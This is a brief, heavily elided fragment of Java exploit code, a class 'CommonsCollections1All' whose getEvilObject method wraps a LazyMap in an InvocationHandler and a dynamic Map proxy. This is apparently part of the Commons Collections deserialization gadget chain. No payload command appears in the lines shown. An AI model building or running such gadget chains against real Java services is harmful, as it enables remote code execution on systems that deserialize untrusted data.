 ...
 * @brief http://gursevkalra.blogspot.com/
 * @Date 2018. 1. 25.
 */
public class CommonsCollections1All {
	...
	public static Object getEvilObject()
		...
		InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class,
				lazyMap);
		Proxy evilProxy = (Proxy) Proxy.newProxyInstance(CommonsCollections1All.class.getClassLoader(),
				new Class[] { Map.class }, secondInvocationHandler);
